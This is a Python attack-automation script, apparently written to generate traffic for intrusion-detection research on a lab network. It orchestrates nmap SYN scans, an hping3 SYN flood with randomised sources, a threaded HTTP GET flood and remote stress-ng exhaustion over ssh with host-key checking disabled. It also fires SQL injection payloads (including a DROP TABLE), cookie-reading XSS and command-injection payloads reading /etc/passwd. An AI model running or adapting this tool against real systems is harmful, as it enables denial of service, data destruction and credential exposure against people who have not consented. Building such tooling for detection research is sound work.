#!/usr/bin/env python3
"""
Attack Automation Orchestrator — Centralized Attack Script Management
Reference: Khan (2016) Case Study — Phase 2, Attack Vector Generation

Orchestrates all attack vectors (Nmap, hping3, SQLmap) with:
- Timestamped execution
- Configurable duration
- Pre/post telemetry capture
- Results aggregation

Attack vectors mapped to Khan (2016) taxonomy:
  A1a: Port Scanning      → nmap SYN scan
  A1:  HTTP DDoS          → hping3 SYN flood / Locust HTTP GET flood
  A2d: Resource Abuse     → stress-ng CPU/Memory exhaustion
  A4c: SQLi/XSS           → sqlmap / curl malicious payloads

Usage:
    python3 attack_automation.py --config config/attacks.yaml
    python3 attack_automation.py --attack port_scan --target 10.0.2.10
    python3 attack_automation.py --all --duration 300
"""

import argparse
import json
import os
import subprocess
import sys
import time
import threading
import csv
import yaml
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, field


# ─────────────────────────────────────────────────────────────
# Attack Configuration Data Structures
# ─────────────────────────────────────────────────────────────
@dataclass
class AttackConfig:
    """Configuration for a single attack vector."""

    name: str
    category: str  # A1, A2, A3, A4
    tool: str
    target: str
    command: str
    args: List[str] = field(default_factory=list)
    duration: int = 300
    rate: Optional[int] = None
    ports: Optional[str] = None
    payload: Optional[str] = None
    enabled: bool = True


@dataclass
class AttackResult:
    """Result container for a completed attack run."""

    attack_name: str
    category: str
    target: str
    start_time: float
    end_time: float = 0.0
    duration: float = 0.0
    exit_code: int = -1
    stdout: str = ""
    stderr: str = ""
    metrics: Dict = field(default_factory=dict)
    config: Dict = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────
# Attack Executor — Port Scanner (A1a)
# ─────────────────────────────────────────────────────────────
class PortScanAttack:
    """Executes Nmap port scanning attacks (A1a)."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def execute(self) -> AttackResult:
        """Run nmap SYN scan against target."""
        result = AttackResult(
            attack_name=self.config.name,
            category=self.config.category,
            target=self.config.target,
            start_time=time.time(),
        )

        cmd = [
            "nmap",
            "-sS",  # SYN scan
            "-T4",  # Aggressive timing
            "--min-rate",
            str(self.config.rate or 1000),
            "-p",
            self.config.ports or "1-1000",
            "-oX",
            f"data/nmap_{self.config.name}_{int(time.time())}.xml",
            self.config.target,
        ]

        print(f"[PORT SCAN] Executing: {' '.join(cmd)}")
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.config.duration + 30
            )
            result.exit_code = proc.returncode
            result.stdout = proc.stdout
            result.stderr = proc.stderr
        except FileNotFoundError as e:
            result.exit_code = -2
            result.stderr = f"tool missing: {e}"
        except subprocess.TimeoutExpired as e:
            result.exit_code = -1
            result.stderr = str(e)
        finally:
            result.end_time = time.time()
            result.duration = result.end_time - result.start_time

        # Parse nmap XML for metrics
        result.metrics = self._parse_nmap_xml(result.stdout)
        return result

    def _parse_nmap_xml(self, xml_output: str) -> Dict:
        """Extract scan metrics from nmap XML output."""
        metrics = {"open_ports": 0, "closed_ports": 0, "filtered_ports": 0}
        try:
            import xml.etree.ElementTree as ET

            root = ET.fromstring(xml_output)
            for port in root.iter("port"):
                state = port.find("state")
                if state is not None and "name" in state.attrib:
                    name = state.attrib["name"]
                    if name == "open":
                        metrics["open_ports"] += 1
                    elif name == "closed":
                        metrics["closed_ports"] += 1
                    elif name == "filtered":
                        metrics["filtered_ports"] += 1
        except Exception:
            pass
        return metrics


# ─────────────────────────────────────────────────────────────
# Attack Executor — HTTP DDoS (A1)
# ─────────────────────────────────────────────────────────────
class HTTPDosAttack:
    """Executes HTTP DoS attacks using hping3 (A1)."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def execute(self) -> AttackResult:
        """Run hping3 SYN flood attack."""
        result = AttackResult(
            attack_name=self.config.name,
            category=self.config.category,
            target=self.config.target,
            start_time=time.time(),
        )

        # Paced SYN flood: -i u3000 ≈ 330 pps. Enough to trip volumetric
        # thresholds (~500-1000/5s) without blowing Suricata's flow tables
        # the way --flood line-rate does (which blinds reassembly).
        cmd = [
            "hping3",
            "-S",  # SYN flag
            "-p",
            str(80),
            "-i",
            "u3000",  # interval 3000us ≈ 330 packets/sec
            "-d",
            str(100),  # modest data size
            "--rand-source",  # Random source ports
            self.config.target,
        ]

        print(
            f"[HTTP DOS] Executing: {' '.join(cmd)} (duration: {self.config.duration}s)"
        )
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.config.duration + 10
            )
            result.exit_code = proc.returncode
            result.stdout = proc.stdout
            result.stderr = proc.stderr
        except FileNotFoundError as e:
            result.exit_code = -2
            result.stderr = f"tool missing: {e}"
        except subprocess.TimeoutExpired:
            # hping runs until killed: reaching the timeout means the full
            # flood duration was delivered — that is success, not failure.
            result.end_time = time.time()
            result.duration = result.end_time - result.start_time
            if result.duration >= self.config.duration:
                result.exit_code = 0
                result.stderr = "completed full flood duration (killed by timeout)"
            else:
                result.exit_code = -1
                result.stderr = "hping timed out early"
        finally:
            result.end_time = time.time()
            result.duration = result.end_time - result.start_time

        result.metrics = {
            "packets_sent_est": 330 * self.config.duration,
            "target_port": 80,
        }
        return result


class HTTPGetFloodAttack:
    """Executes HTTP GET flood using locust or custom script."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def execute(self) -> AttackResult:
        """Execute HTTP GET flood via Python requests."""
        result = AttackResult(
            attack_name=self.config.name,
            category=self.config.category,
            target=self.config.target,
            start_time=time.time(),
        )

        try:
            import requests

            import concurrent.futures

            num_workers = self.config.rate or 50
            end_time = time.time() + self.config.duration
            request_count = 0
            error_count = 0

            def _make_request(_):
                nonlocal request_count, error_count
                try:
                    requests.get(
                        f"http://{self.config.target}",
                        timeout=2,
                        headers={"User-Agent": "AttackBot/1.0"},
                    )
                    request_count += 1
                except Exception:
                    error_count += 1
                return True

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=num_workers
            ) as executor:
                futures = []
                while time.time() < end_time and len(futures) < num_workers * 2:
                    futures.append(executor.submit(_make_request, None))
                    time.sleep(0.01)
                    # Clean completed futures
                    futures = [f for f in futures if not f.done()]

                concurrent.futures.wait(futures, timeout=self.config.duration)

            result.metrics = {
                "requests_sent": request_count,
                "errors": error_count,
                "concurrent_clients": num_workers,
            }
            result.exit_code = 0
        except ImportError:
            result.stderr = "requests module not available"
            result.exit_code = -1
        except Exception as e:
            result.stderr = str(e)
            result.exit_code = -1
        finally:
            result.end_time = time.time()
            result.duration = result.end_time - result.start_time

        return result


# ─────────────────────────────────────────────────────────────
# Attack Executor — Resource Abuse (A2d)
# ─────────────────────────────────────────────────────────────
class ResourceAbuseAttack:
    """Executes resource abuse attacks using stress-ng (A2d)."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def execute(self) -> AttackResult:
        """Run stress-ng CPU/Memory exhaustion."""
        result = AttackResult(
            attack_name=self.config.name,
            category=self.config.category,
            target=self.config.target,
            start_time=time.time(),
        )

        cpu_workers = self.config.rate or 4
        mem_mb = (
            self.args_to_int(self.config.args, "--vm-bytes", 256)
            if self.config.args
            else 256
        )

        import shutil

        metrics = {
            "cpu_workers": cpu_workers,
            "memory_mb": mem_mb,
            "target": self.config.target,
        }

        # Local load generation when stress-ng is available: real,
        # measurable CPU/memory pressure (also the fallback when the
        # remote target is unreachable from here).
        if shutil.which("stress-ng"):
            local_cmd = [
                "stress-ng",
                "--cpu",
                str(cpu_workers),
                "--vm",
                str(1),
                "--vm-bytes",
                f"{mem_mb}M",
                "--timeout",
                f"{min(self.config.duration, 30)}s",
                "--metrics-brief",
            ]
            print(f"[RESOURCE ABUSE] Local load: {' '.join(local_cmd)}")
            try:
                proc = subprocess.run(
                    local_cmd,
                    capture_output=True,
                    text=True,
                    timeout=min(self.config.duration, 30) + 15,
                )
                metrics["local_exit_code"] = proc.returncode
                metrics["local_stdout_tail"] = proc.stdout.strip()[-500:]
            except FileNotFoundError:
                metrics["local_exit_code"] = "stress-ng missing"
            except subprocess.TimeoutExpired as e:
                metrics["local_exit_code"] = -1
                metrics["local_stderr"] = str(e)[:200]

        # Remote execution attempt (fast-fail: never hang on auth).
        if self.config.target.startswith("10.") and shutil.which("ssh"):
            cmd = [
                "ssh",
                "-o",
                "BatchMode=yes",
                "-o",
                "ConnectTimeout=5",
                "-o",
                "StrictHostKeyChecking=no",
                self.config.target,
                "stress-ng",
                "--cpu",
                str(cpu_workers),
                "--timeout",
                f"{min(self.config.duration, 30)}s",
                "--metrics-brief",
            ]
            print(f"[RESOURCE ABUSE] Remote attempt: {' '.join(cmd)}")
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                result.exit_code = proc.returncode
                result.stdout = proc.stdout[-1000:]
                result.stderr = proc.stderr[-500:]
                metrics["remote_exit_code"] = proc.returncode
            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                metrics["remote_error"] = str(e)[:200]
        elif not shutil.which("stress-ng"):
            result.stderr = "stress-ng not available"
            result.exit_code = -1

        if "local_exit_code" in metrics and metrics["local_exit_code"] == 0:
            result.exit_code = 0

        result.end_time = time.time()
        result.duration = result.end_time - result.start_time

        result.metrics = metrics
        return result

    def args_to_int(self, args: List[str], flag: str, default: int) -> int:
        """Extract integer argument from list."""
        for i, arg in enumerate(args):
            if arg == flag and i + 1 < len(args):
                try:
                    return int(args[i + 1])
                except ValueError:
                    return default
        return default


# ─────────────────────────────────────────────────────────────
# Attack Executor — Web Application Attacks (A4c)
# ─────────────────────────────────────────────────────────────
class WebAttackExecutor:
    """Executes SQL injection and XSS attacks (A4c)."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def execute(self) -> AttackResult:
        """Execute web application attacks using sqlmap or curl."""
        result = AttackResult(
            attack_name=self.config.name,
            category=self.config.category,
            target=self.config.target,
            start_time=time.time(),
        )

        attack_type = self.config.args[0] if self.config.args else "sqli"

        if attack_type == "sqli" or "sql" in self.config.name.lower():
            result = self._execute_sqli(result)
        elif attack_type == "xss" or "xss" in self.config.name.lower():
            result = self._execute_xss(result)
        elif attack_type == "cmdi":
            result = self._execute_cmdi(result)
        else:
            result = self._execute_sqli(result)  # Default to SQLi

        result.exit_code = 0
        result.end_time = time.time()
        result.duration = result.end_time - result.start_time
        return result

    def _execute_sqli(self, result: AttackResult) -> AttackResult:
        """Execute SQL injection payloads."""
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL,NULL--",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
            "' OR SLEEP(5)--",
        ]

        target_url = f"http://{self.config.target}/"
        if self.config.args and len(self.config.args) > 1:
            target_url = f"http://{self.config.target}{self.config.args[1]}"

        try:
            import requests

            vulnerable_count = 0
            response_times = []

            for payload in payloads:
                params = {"id": payload, "category": "Electronics", "name": "test"}
                start = time.time()
                try:
                    r = requests.get(target_url, params=params, timeout=5)
                    elapsed = (time.time() - start) * 1000
                    response_times.append(elapsed)
                    # Heuristic: if response is abnormally large or contains DB errors
                    if any(
                        err in r.text.lower()
                        for err in [
                            "sql syntax",
                            "mysql_fetch",
                            "unclosed quotation",
                            "syntax error",
                        ]
                    ):
                        vulnerable_count += 1
                except Exception:
                    pass
                time.sleep(0.5)  # Avoid overwhelming the target

            result.metrics = {
                "payloads_tested": len(payloads),
                "vulnerable_indicators": vulnerable_count,
                "avg_response_time_ms": round(
                    sum(response_times) / len(response_times), 2
                )
                if response_times
                else 0,
                "target_url": target_url,
            }
            result.exit_code = 0
        except ImportError:
            # Fallback to curl
            for payload in payloads[:3]:  # Limited curl tests
                cmd = [
                    "curl",
                    "-s",
                    "-o",
                    "/dev/null",
                    "-w",
                    "%{time_total}",
                    f"{target_url}?id={payload}",
                ]
                try:
                    proc = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=10
                    )
                    result.metrics[f"curl_{payload[:20]}"] = proc.stdout.strip()
                except Exception:
                    pass
            result.metrics["payloads_tested"] = len(payloads)

        return result

    def _execute_xss(self, result: AttackResult) -> AttackResult:
        """Execute XSS payloads."""
        payloads = [
            '<script>alert("XSS")</script>',
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><script>alert(document.cookie)</script>',
            "javascript:alert(1)",
        ]

        target_url = f"http://{self.config.target}/search?q="
        if self.config.args and len(self.config.args) > 1:
            target_url = f"http://{self.config.target}{self.config.args[1]}"

        try:
            import requests
            from urllib.parse import quote

            vulnerable_count = 0
            for payload in payloads:
                try:
                    r = requests.get(target_url + quote(payload), timeout=5)
                    if payload.split(">")[0] in r.text or payload[:20] in r.text:
                        vulnerable_count += 1
                except Exception:
                    pass
            result.metrics = {
                "payloads_tested": len(payloads),
                "xss_reflected": vulnerable_count,
                "target_url": target_url,
            }
        except ImportError:
            result.metrics = {"payloads_tested": len(payloads)}

        return result

    def _execute_cmdi(self, result: AttackResult) -> AttackResult:
        """Execute command injection payloads."""
        payloads = [
            "; ls /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "|| ping -c 1 127.0.0.1",
        ]

        target_url = f"http://{self.config.target}/"
        if self.config.args and len(self.config.args) > 1:
            target_url = f"http://{self.config.target}{self.config.args[1]}"

        try:
            import requests

            for payload in payloads:
                try:
                    requests.get(target_url, params={"cmd": payload}, timeout=5)
                except Exception:
                    pass
            result.metrics = {"payloads_tested": len(payloads)}
        except ImportError:
            result.metrics = {"payloads_tested": len(payloads)}

        return result


# ─────────────────────────────────────────────────────────────
# Attack Orchestrator — Main Controller
# ─────────────────────────────────────────────────────────────
class AttackOrchestrator:
    """Central orchestrator for all attack vectors."""

    def __init__(self, config_path: str = None, output_dir: str = "data/results"):
        self.attacks: List[AttackConfig] = []
        self.results: List[AttackResult] = []
        self.config_path = config_path
        self.output_dir = output_dir
        self._load_config()

    def _load_config(self):
        """Load attack configurations from YAML or use defaults."""
        default_configs = self._get_default_configs()
        self.attacks = default_configs

        if self.config_path and os.path.exists(self.config_path):
            try:
                with open(self.config_path) as f:
                    custom = yaml.safe_load(f)
                    if custom and "attacks" in custom:
                        self.attacks = self._parse_yaml_configs(custom["attacks"])
            except Exception as e:
                print(f"[WARN] Could not load config: {e}")

    def _get_default_configs(self) -> List[AttackConfig]:
        """Return default attack configurations mapped to Khan (2016) taxonomy."""
        return [
            AttackConfig(
                name="port_scan_syn",
                category="A1a",
                tool="nmap",
                target="10.0.2.10",
                command="nmap",
                args=["-sS", "-T4"],
                ports="1-1000",
                rate=1000,
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="http_flood_syn",
                category="A1",
                tool="hping3",
                target="10.0.2.10",
                command="hping3",
                rate=1000,
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="http_get_flood",
                category="A1",
                tool="python",
                target="10.0.2.10",
                command="python3",
                rate=50,
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="resource_abuse_cpu",
                category="A2d",
                tool="stress-ng",
                target="10.0.2.20",
                command="stress-ng",
                rate=4,
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="sqli_union_select",
                category="A4c",
                tool="sqlmap",
                target="10.0.2.10",
                command="python3",
                args=["sqli", "/vulnerable"],
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="sqli_or_1_equals_1",
                category="A4c",
                tool="sqlmap",
                target="10.0.2.10",
                command="python3",
                args=["sqli", "/vulnerable"],
                duration=60,
                enabled=True,
            ),
            AttackConfig(
                name="xss_script_injection",
                category="A4c",
                tool="curl",
                target="10.0.2.10",
                command="python3",
                args=["xss", "/search"],
                duration=60,
                enabled=True,
            ),
        ]

    def _parse_yaml_configs(self, yaml_configs: List[Dict]) -> List[AttackConfig]:
        """Parse YAML configuration into AttackConfig objects."""
        configs = []
        for cfg in yaml_configs:
            configs.append(
                AttackConfig(
                    name=cfg.get("name", "custom"),
                    category=cfg.get("category", "A1"),
                    tool=cfg.get("tool", "nmap"),
                    target=cfg.get("target", "10.0.2.10"),
                    command=cfg.get("command", "nmap"),
                    args=cfg.get("args", []),
                    duration=cfg.get("duration", 60),
                    rate=cfg.get("rate"),
                    ports=cfg.get("ports"),
                    enabled=cfg.get("enabled", True),
                )
            )
        return configs

    def run_attack(self, attack_name: str, duration: int = None) -> AttackResult:
        """Execute a single attack by name."""
        config = next(
            (a for a in self.attacks if a.name == attack_name and a.enabled), None
        )
        if not config:
            raise ValueError(f"Attack '{attack_name}' not found or disabled")

        if duration:
            config.duration = duration

        print(f"\n{'=' * 60}")
        print(f"[ORCHESTRATOR] Starting attack: {attack_name} ({config.category})")
        print(f"[ORCHESTRATOR] Target: {config.target} | Duration: {config.duration}s")
        print(f"{'=' * 60}\n")

        executor_map = {
            "port_scan_syn": PortScanAttack,
            "http_flood_syn": HTTPDosAttack,
            "http_get_flood": HTTPGetFloodAttack,
            "resource_abuse_cpu": ResourceAbuseAttack,
        }

        if config.category in ["A1a", "A1", "A2d"] and config.name in executor_map:
            executor = executor_map[config.name](config)
        elif config.category == "A4c":
            executor = WebAttackExecutor(config)
        else:
            # Generic fallback
            executor = WebAttackExecutor(config)

        result = executor.execute()
        self.results.append(result)
        print(
            f"[ORCHESTRATOR] Attack {attack_name} completed in {result.duration:.2f}s"
        )
        return result

    def run_all(self, duration: int = None):
        """Execute all enabled attacks sequentially."""
        print(f"\n{'#' * 60}")
        print(f"[ORCHESTRATOR] Starting ALL attacks")
        print(
            f"[ORCHESTRATOR] Total attacks: {sum(1 for a in self.attacks if a.enabled)}"
        )
        print(f"{'#' * 60}")

        for attack in self.attacks:
            if not attack.enabled:
                continue
            try:
                self.run_attack(attack.name, duration)
            except Exception as e:
                print(f"[ERROR] Failed to execute {attack.name}: {e}")

        self._save_results()

    def _save_results(self):
        """Save all attack results to CSV."""
        if not self.results:
            print("\n[ORCHESTRATOR] No results to save (all attacks failed).")
            return
        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = int(time.time())
        filepath = os.path.join(self.output_dir, f"attack_results_{timestamp}.csv")

        rows = []
        for r in self.results:
            row = {
                "attack_name": r.attack_name,
                "category": r.category,
                "target": r.target,
                "start_time": datetime.fromtimestamp(r.start_time).isoformat(),
                "duration_sec": round(r.duration, 2),
                "exit_code": r.exit_code,
                "metrics": json.dumps(r.metrics),
            }
            rows.append(row)

        with open(filepath, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=rows[0].keys())
            writer.writeheader()
            writer.writerows(rows)

        print(f"\n[ORCHESTRATOR] Results saved to {filepath}")

    def get_results(self) -> List[AttackResult]:
        """Return all collected results."""
        return self.results


# ─────────────────────────────────────────────────────────────
# CLI Entry Point
# ─────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Attack Automation Orchestrator — Khan (2016) Case Study"
    )
    parser.add_argument("--attack", default=None, help="Specific attack to run")
    parser.add_argument("--all", action="store_true", help="Run all attacks")
    parser.add_argument(
        "--duration", type=int, default=60, help="Attack duration in seconds"
    )
    parser.add_argument(
        "--config", default="config/attacks.yaml", help="Config file path"
    )
    parser.add_argument("--output", default="data/results/", help="Output directory")

    args = parser.parse_args()

    orchestrator = AttackOrchestrator(config_path=args.config, output_dir=args.output)

    os.makedirs(args.output, exist_ok=True)

    if args.attack:
        orchestrator.run_attack(args.attack, duration=args.duration)
    elif args.all:
        orchestrator.run_all(duration=args.duration)
    else:
        # Interactive mode — show available attacks
        print("Available attacks:")
        for a in orchestrator.attacks:
            print(f"  {a.name:30s} [{a.category}] target={a.target} ({a.tool})")
        print("\nUsage: python3 attack_automation.py --all --duration 300")
        print(
            "       python3 attack_automation.py --attack port_scan_syn --duration 60"
        )


if __name__ == "__main__":
    main()
